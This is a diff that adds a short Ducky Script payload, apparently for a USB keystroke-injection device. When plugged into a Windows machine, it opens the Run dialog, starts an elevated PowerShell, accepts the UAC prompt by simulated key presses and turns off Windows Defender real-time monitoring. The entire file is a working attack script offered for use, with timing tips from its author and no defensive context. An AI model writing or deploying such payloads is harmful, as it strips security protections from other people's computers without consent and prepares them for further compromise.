@@ -1,0 +1,11 @@
+REM Disable Windows Defender with Powershell
+REM Feels a little slow - play around with delay to increase speed.
+REM Author: Nautilus 
+DELAY 1000
+GUI r
+DELAY 1000
+STRING powershell start powershell -A 'Set-MpPreference -DisableRealtimeMonitoring $true' -V runAs
+ENTER
+DELAY 500
+LEFT
+ENTER
